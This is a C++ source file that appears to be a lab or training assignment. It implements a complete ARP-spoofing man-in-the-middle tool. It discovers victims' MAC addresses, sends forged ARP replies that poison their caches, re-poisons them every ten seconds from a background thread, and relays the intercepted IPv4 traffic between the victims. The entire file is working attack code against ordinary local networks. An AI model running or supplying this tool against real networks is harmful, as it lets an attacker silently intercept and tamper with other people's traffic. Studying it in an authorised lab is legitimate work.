#include <cstdio>
#include <cstdlib>
#include <pcap.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <string>
#include <vector>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct EthIpPacket {
    EthHdr eth_;
    IpHdr ip_;
};
#pragma pack(pop)

struct Flow {
    Ip sender_ip;
    Ip target_ip;
    Mac sender_mac;
    Mac target_mac;
};

struct ThreadArg {
    pcap_t* handle;
    std::vector<Flow>* flows;
};

uint8_t attacker_mac[6];
Ip attacker_ip;

bool getAttackerInfo(const char* dev, uint8_t* mac, Ip* ip) {
    struct ifreq ifr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) return false;

    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) != 0) return false;
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    if (ioctl(sockfd, SIOCGIFADDR, &ifr) != 0) return false;
    *ip = Ip(inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));

    close(sockfd);
    return true;
}

void sendArpRequest(pcap_t* handle, Ip target_ip) {
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = Mac(attacker_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(attacker_mac);
    packet.arp_.sip_ = htonl(attacker_ip);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(target_ip);

    pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
}

Mac waitArpReply(pcap_t* handle, Ip target_ip) {
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res != 1) continue;
        EthHdr* eth_hdr = (EthHdr*)packet;
        if (eth_hdr->type() != EthHdr::Arp) continue;

        ArpHdr* arp_hdr = (ArpHdr*)(packet + sizeof(EthHdr));
        if (arp_hdr->op() == ArpHdr::Reply && arp_hdr->sip() == target_ip)
            return arp_hdr->smac();
    }
}

void sendArpReply(pcap_t* handle, Ip sender_ip, Ip target_ip, Mac sender_mac) {
    EthArpPacket packet;
    packet.eth_.dmac_ = sender_mac;
    packet.eth_.smac_ = Mac(attacker_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(attacker_mac);
    packet.arp_.sip_ = htonl(target_ip);
    packet.arp_.tmac_ = sender_mac;
    packet.arp_.tip_ = htonl(sender_ip);

    pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
}

void* reinfectThread(void* arg) {
    ThreadArg* ta = (ThreadArg*)arg;
    while (true) {
        sleep(10);
        for (const Flow& f : *(ta->flows)) {
            sendArpReply(ta->handle, f.sender_ip, f.target_ip, f.sender_mac);
        }
    }
    return nullptr;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        printf("syntax: %s <interface> <sender ip 1> <target ip 1> [...]", argv[0]);
        return -1;
    }
    const char* dev = argv[1];

    if (!getAttackerInfo(dev, attacker_mac, &attacker_ip)) {
        fprintf(stderr, "[!] Failed to get attacker info\n");
        return -1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (!handle) {
        fprintf(stderr, "[!] Couldn't open device: %s\n", errbuf);
        return -1;
    }

    std::vector<Flow> flows;
    for (int i = 2; i < argc; i += 2) {
        Ip sender_ip = Ip(argv[i]);
        Ip target_ip = Ip(argv[i + 1]);

        sendArpRequest(handle, sender_ip);
        Mac sender_mac = waitArpReply(handle, sender_ip);

        sendArpRequest(handle, target_ip);
        Mac target_mac = waitArpReply(handle, target_ip);

        sendArpReply(handle, sender_ip, target_ip, sender_mac);
        flows.push_back({sender_ip, target_ip, sender_mac, target_mac});
    }

    ThreadArg thread_arg = {handle, &flows};
    pthread_t t;
    pthread_create(&t, nullptr, reinfectThread, &thread_arg);

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res != 1) continue;
        EthHdr* eth_hdr = (EthHdr*)packet;
        if (eth_hdr->type() != EthHdr::Ip4) continue;

        IpHdr* ip_hdr = (IpHdr*)(packet + sizeof(EthHdr));
        for (const Flow& f : flows) {
            if (ip_hdr->sip() == f.sender_ip) {
                eth_hdr->dmac_ = f.target_mac;
                eth_hdr->smac_ = Mac(attacker_mac);
                pcap_sendpacket(handle, packet, header->caplen);
            }
            else if (ip_hdr->dip() == f.sender_ip) {
                eth_hdr->dmac_ = f.sender_mac;
                eth_hdr->smac_ = Mac(attacker_mac);
                pcap_sendpacket(handle, packet, header->caplen);
            }
        }
    }

    pcap_close(handle);
    return 0;
}

